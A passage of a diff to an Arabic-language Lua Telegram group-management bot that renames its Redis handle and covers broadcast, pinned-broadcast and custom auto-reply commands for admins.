+if DevABS:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevBRAND:setex(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+DevABS:setex(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevBRAND:get(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevABS:get(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false  
 end 
-local List = DevBRAND:smembers(BRAND..'BRAND:Users')   
+local List = DevABS:smembers(BRAND..'BRAND:Users')   
 for k,v in pairs(List) do  
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
 --     Source BRAND     --
 if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه بالتثبيت ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevBRAND:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
+if DevABS:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevBRAND:setex(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+DevABS:setex(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevBRAND:get(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevABS:get(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == "الغاء" then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end 
-local List = DevBRAND:smembers(BRAND.."BRAND:Groups") 
+local List = DevABS:smembers(BRAND.."BRAND:Groups") 
 if msg.content_.text_ then
 for k,v in pairs(List) do 
 BRANDText = "الرساله"
 send(v, 0,"["..msg.content_.text_.."]") 
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.text_) 
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.text_) 
 end
 elseif msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -9591,183 +9591,183 @@ end
 for k,v in pairs(List) do 
 BRANDText = "الصوره"
 sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,photo) 
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,photo) 
 end 
 elseif msg.content_.animation_ then
 for k,v in pairs(List) do 
 BRANDText = "المتحركه"
 sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
 end 
 elseif msg.content_.video_ then
 for k,v in pairs(List) do 
 BRANDText = "الفيديو"
 sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
 end 
 elseif msg.content_.voice_ then
 for k,v in pairs(List) do 
 BRANDText = "البصمه"
 sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
 end 
 elseif msg.content_.audio_ then
 for k,v in pairs(List) do 
 BRANDText = "الصوت"
 sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
 end 
 elseif msg.content_.document_ then
 for k,v in pairs(List) do 
 BRANDText = "الملف"
 sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
 end 
 elseif msg.content_.sticker_ then
 for k,v in pairs(List) do 
 BRANDText = "الملصق"
 sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
-DevBRAND:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
+DevABS:set(BRAND..'BRAND:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
 end 
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..BRANDText.." بالتثبيت \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end
 --     Source BRAND     --
 if text == 'حذف رد من متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد من متعدد' and Manager(msg) and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
 if #List == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
 return false
 end
-DevBRAND:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
+DevABS:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local DelGpRedRedod = DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local DelGpRedRedod = DevABS:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if DelGpRedRedod == 'DelGpRedRedod' then
 if text == "الغاء" then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
-if not DevBRAND:sismember(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text) then
+if not DevABS:sismember(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لايوجد رد متعدد لهذه الكلمه ↫ "..text ,  1, "md")
 return false
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه ↫ "..text ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
-DevBRAND:set(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
+DevABS:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
+DevABS:set(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
 return false
 end end
 if text == 'حذف رد متعدد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد متعدد' and Manager(msg) and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
 if #List == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
 return false
 end
-DevBRAND:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
+DevABS:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
 return false
 end
 if text == 'اضف رد متعدد' and Manager(msg) and ChCheck(msg) then
-DevBRAND:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
+DevABS:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان" ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local SetGpRedod = DevBRAND:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+local SetGpRedod = DevABS:get(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 if SetGpRedod == 'SetGpRedod' then
 if text == "الغاء" then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
-if DevBRAND:sismember(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text) then
+if DevABS:sismember(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text) then
 local BRAND = "⌁︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
 keyboard = {} 
 keyboard.inline_keyboard = {{{text="حذف الرد ↫ "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
 Msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(BRAND).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
-DevBRAND:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الامر ارسل الرد الاول\n⌁︙للخروج ارسل ↫ ( الغاء )" ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
-DevBRAND:set(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
-DevBRAND:sadd(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text)
+DevABS:set(BRAND..'BRAND:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
+DevABS:set(BRAND..'BRAND:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
+DevABS:sadd(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_,text)
 return false
 end end
 --     Source BRAND     --
 if text == 'حذف رد' and Manager(msg) and ChCheck(msg) or text == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
-local List = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
+local List = DevABS:smembers(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
 if #List == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 return false
 end
-DevBRAND:set(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
+DevABS:set(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
 return false
 end
 if text == 'اضف رد' and Manager(msg) and ChCheck(msg) then
-DevBRAND:set(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
+DevABS:set(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local SetGpRed = DevBRAND:get(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local SetGpRed = DevABS:get(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 if SetGpRed == 'SetGpRed' then
 if text == "الغاء" then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevBRAND:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
-DevBRAND:set(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
-DevBRAND:set(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
-DevBRAND:sadd(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_,text)
-DevBRAND:set(BRAND..'DelManagerRep'..msg.chat_id_,text)
+DevABS:set(BRAND..'BRAND:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
+DevABS:set(BRAND..'BRAND:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
+DevABS:sadd(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_,text)
+DevABS:set(BRAND..'DelManagerRep'..msg.chat_id_,text)
 return false
 end end
 --     Source BRAND     --
 if text == 'حذف رد عام' and SecondSudo(msg) or text == '↫ حذف رد عام ⌁' and SecondSudo(msg) or text == 'مسح رد عام' and SecondSudo(msg) then
-local List = DevBRAND:smembers(BRAND.."BRAND:Sudo:AllRed")
+local List = DevABS:smembers(BRAND.."BRAND:Sudo:AllRed")
 if #List == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 return false
 end
-DevBRAND:set(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
+DevABS:set(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
 return false
 end
 if text == 'اضف رد عام' and SecondSudo(msg) or text == '↫ اضف رد عام ⌁' and SecondSudo(msg) then
-DevBRAND:set(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
+DevABS:set(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local SetAllRed = DevBRAND:get(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
+local SetAllRed = DevABS:get(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_)
 if SetAllRed == 'SetAllRed' then
 if text == "الغاء" then 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevBRAND:del(BRAND..'BRAND:Add:AllRed'..msg.sender_user_id_)
+DevABS:del(BRAND..'BRAND:Add:AllRed'..msg.sender_user_id_)
 return false
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
-DevBRAND:set(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
-DevBRAND:set(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_, text)
-DevBRAND:sadd(BRAND.."BRAND:Sudo:AllRed",text)
-DevBRAND:set(BRAND.."DelSudoRep",text)
+DevABS:set(BRAND.."BRAND:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
+DevABS:set(BRAND.."BRAND:Add:AllText"..msg.sender_user_id_, text)
+DevABS:sadd(BRAND.."BRAND:Sudo:AllRed",text)
+DevABS:set(BRAND.."DelSudoRep",text)
 return false 
 end end
 --     Source BRAND     --
 if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
-local redod = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
+local redod = DevABS:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
 MsgRep = '⌁︙قائمة الردود المتعدده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 for k,v in pairs(redod) do
-MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevBRAND:smembers(BRAND..'BRAND:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
+MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevABS:smembers(BRAND..'BRAND:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
 end
 if #redod == 0 then
 MsgRep = '⌁︙لا توجد ردود متعدده مضافه'
@@ -9775,13 +9775,13 @@ end
 send(msg.chat_id_,msg.id_,MsgRep)
 end
 if text == 'حذف الردود المتعدده' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود المتعدده' and Manager(msg) and ChCheck(msg) then
-local redod = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
+local redod = DevABS:smembers(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
 if #redod == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-DevBRAND:del(BRAND..'BRAND:Text:GpTexts'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Text:GpTexts'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Manager:GpRedod'..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الردود المتعدده")  
 return false
@@ -9789,24 +9789,24 @@ end
 end
 --     Source BRAND     --
 if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
-local redod = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
+local redod = DevABS:smembers(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
 MsgRep = '⌁︙ردود المدير ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 for k,v in pairs(redod) do
-if DevBRAND:get(BRAND.."BRAND:Gif:GpRed"..v..msg.chat_id_) then
+if DevABS:get(BRAND.."BRAND:Gif:GpRed"..v..msg.chat_id_) then
 dp = 'متحركه 🎭'
-elseif DevBRAND:get(BRAND.."BRAND:Voice:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:Voice:GpRed"..v..msg.chat_id_) then
 dp = 'بصمه 🎙'
-elseif DevBRAND:get(BRAND.."BRAND:Stecker:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:Stecker:GpRed"..v..msg.chat_id_) then
 dp = 'ملصق 🃏'
-elseif DevBRAND:get(BRAND.."BRAND:Text:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:Text:GpRed"..v..msg.chat_id_) then
 dp = 'رساله ✉'
-elseif DevBRAND:get(BRAND.."BRAND:Photo:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:Photo:GpRed"..v..msg.chat_id_) then
 dp = 'صوره 🎇'
-elseif DevBRAND:get(BRAND.."BRAND:Video:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:Video:GpRed"..v..msg.chat_id_) then
 dp = 'فيديو 📽'
-elseif DevBRAND:get(BRAND.."BRAND:File:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:File:GpRed"..v..msg.chat_id_) then
 dp = 'ملف 📁'
-elseif DevBRAND:get(BRAND.."BRAND:Audio:GpRed"..v..msg.chat_id_) then
+elseif DevABS:get(BRAND.."BRAND:Audio:GpRed"..v..msg.chat_id_) then
 dp = 'اغنيه 🎶'
 end
 MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
@@ -9817,20 +9817,20 @@ end
 send(msg.chat_id_,msg.id_,MsgRep)
 end
 if text == 'حذف الردود' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود' and Manager(msg) and ChCheck(msg) or text == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or text == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
-local redod = DevBRAND:smembers(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
+local redod = DevABS:smembers(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
 if #redod == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-DevBRAND:del(BRAND..'BRAND:Gif:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Voice:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Audio:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Photo:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Stecker:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Video:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:File:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Text:GpRed'..v..msg.chat_id_)
-DevBRAND:del(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Gif:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Voice:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Audio:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Photo:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Stecker:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Video:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:File:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Text:GpRed'..v..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Manager:GpRed'..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف ردود المدير")  
 return false
@@ -9838,24 +9838,24 @@ end
 end
 --     Source BRAND     --
 if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام ⌁" and SecondSudo(msg) then
-local redod = DevBRAND:smembers(BRAND.."BRAND:Sudo:AllRed")
+local redod = DevABS:smembers(BRAND.."BRAND:Sudo:AllRed")
 MsgRep = '⌁︙ردود المطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 for k,v in pairs(redod) do
-if DevBRAND:get(BRAND.."BRAND:Gif:AllRed"..v) then
+if DevABS:get(BRAND.."BRAND:Gif:AllRed"..v) then
 dp = 'متحركه 🎭'
-elseif DevBRAND:get(BRAND.."BRAND:Voice:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:Voice:AllRed"..v) then
 dp = 'بصمه 🎙'
-elseif DevBRAND:get(BRAND.."BRAND:Stecker:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:Stecker:AllRed"..v) then
 dp = 'ملصق 🃏'
-elseif DevBRAND:get(BRAND.."BRAND:Text:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:Text:AllRed"..v) then
 dp = 'رساله ✉'
-elseif DevBRAND:get(BRAND.."BRAND:Photo:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:Photo:AllRed"..v) then
 dp = 'صوره 🎇'
-elseif DevBRAND:get(BRAND.."BRAND:Video:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:Video:AllRed"..v) then
 dp = 'فيديو 📽'
-elseif DevBRAND:get(BRAND.."BRAND:File:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:File:AllRed"..v) then
 dp = 'ملف 📁'
-elseif DevBRAND:get(BRAND.."BRAND:Audio:AllRed"..v) then
+elseif DevABS:get(BRAND.."BRAND:Audio:AllRed"..v) then
 dp = 'اغنيه 🎶'
 end
 MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
@@ -9866,21 +9866,21 @@ end
 send(msg.chat_id_,msg.id_,MsgRep)
 end
 if text == "حذف ردود المطور" and SecondSudo(msg) or text == "حذف ردود العام" and SecondSudo(msg) or text == "مسح ردود المطور" and SecondSudo(msg) then
-local redod = DevBRAND:smembers(BRAND.."BRAND:Sudo:AllRed")
+local redod = DevABS:smembers(BRAND.."BRAND:Sudo:AllRed")
 if #redod == 0 then
